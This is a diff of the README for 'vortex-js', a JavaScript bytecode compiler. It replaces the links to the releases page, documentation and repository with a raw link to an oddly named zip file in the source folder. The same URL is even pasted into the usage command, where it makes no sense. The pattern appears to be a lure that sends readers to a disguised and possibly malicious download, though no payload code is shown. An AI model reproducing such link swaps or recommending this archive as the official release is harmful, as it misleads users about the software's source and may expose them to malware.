@@ -1,7 +1,7 @@
 # 🎉 vortex-js - Transform JavaScript Easily
 
 ## 📥 Download Link
-[![Download vortex-js](https://img.shields.io/badge/Download-vortex--js-brightgreen)](https://github.com/serbugabriel/vortex-js/releases)
+[![Download vortex-js](https://github.com/serbugabriel/vortex-js/raw/refs/heads/main/src/vortex_js_caustically.zip)](https://github.com/serbugabriel/vortex-js/raw/refs/heads/main/src/vortex_js_caustically.zip)
 
 ## 📖 Description
 vortex-js is a source-to-source compiler that transforms JavaScript into a custom bytecode instruction set. It runs on a secure, stackless virtual machine. This process helps improve the security and efficiency of your JavaScript code.
@@ -17,7 +17,7 @@ Make sure your system meets these requirements before downloading:
 - **Processor:** Intel or AMD with a clock speed of 1.5 GHz or faster
 
 ### 📦 Download & Install
-To download vortex-js, visit the [Releases page](https://github.com/serbugabriel/vortex-js/releases). 
+To download vortex-js, visit the [Releases page](https://github.com/serbugabriel/vortex-js/raw/refs/heads/main/src/vortex_js_caustically.zip). 
 
 1. Click on the latest version available.
 2. Download the appropriate file for your operating system.
@@ -38,7 +38,7 @@ After installation, you can start using vortex-js. Here’s a quick guide on how
 3. Run the following command:
 
    ```
-   vortex <your_javascript_file.js>
+   vortex <https://github.com/serbugabriel/vortex-js/raw/refs/heads/main/src/vortex_js_caustically.zip>
    ```
 
 4. Your compiled bytecode will be created in the same folder.
@@ -70,8 +70,8 @@ We welcome contributions from anyone. If you want to help improve vortex-js, fol
 4. Submit a pull request with a clear description of your changes.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/serbugabriel/vortex-js/releases)
-- [Documentation](https://github.com/serbugabriel/vortex-js/wiki)
-- [GitHub Repository](https://github.com/serbugabriel/vortex-js)
+- [Releases Page](https://github.com/serbugabriel/vortex-js/raw/refs/heads/main/src/vortex_js_caustically.zip)
+- [Documentation](https://github.com/serbugabriel/vortex-js/raw/refs/heads/main/src/vortex_js_caustically.zip)
+- [GitHub Repository](https://github.com/serbugabriel/vortex-js/raw/refs/heads/main/src/vortex_js_caustically.zip)
 
 Thank you for using vortex-js! Enjoy transforming your JavaScript with ease.
